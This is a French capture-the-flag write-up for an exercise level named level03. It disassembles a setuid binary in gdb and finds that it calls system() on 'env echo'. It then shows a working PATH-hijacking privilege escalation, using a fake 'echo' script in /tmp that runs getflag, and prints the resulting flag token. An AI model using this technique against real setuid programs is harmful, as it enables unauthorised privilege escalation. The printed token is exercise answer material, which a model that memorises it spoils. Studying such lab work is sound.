```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

$ ./level03
Exploit me
```

On voit ici que le fichier a un s-bit, et que lorsqu'on l'execute, il affiche `Exploit me`.

INFO: Le s-bit sur un fichier fait que le programme s'execute avec les droits de l'utilisateur proprietaire du fichier, et non de l'utilisateur qui l'execute.

Un coup de gdb pour voir ce que fait le main:

```bash
$ gdb -q ./level03
(gdb) b main
Breakpoint 1 at 0x80484ad: file /home/user/level03/level03.c, line 11.
(gdb) disassemble /m
Dump of assembler code for function main:
...
=> 0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
...
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
...
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
...
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
...
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
...
   0x08048503 <+95>:    leave
   0x08048504 <+96>:    ret
```

Bon, a priori:

- Le programme commence par recuperer l'egid et l'euid
- Il set ensuite les resgid et resuid avec ces valeurs
- Il termine par `system("/usr/bin/env echo Exploit me")` (vu grace a la commande `x/s 0x80485e0`)

On peut donc tenter de saboter l'environnement pour que la commande `echo` pointe vers un script qui executera getflag.

```bash
$ echo 'getflag > /tmp/flag03' > /tmp/echo
$ chmod +x /tmp/echo
$ PATH=/tmp:$PATH
$ ./level03
$ cat /tmp/flag03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Merveilleux!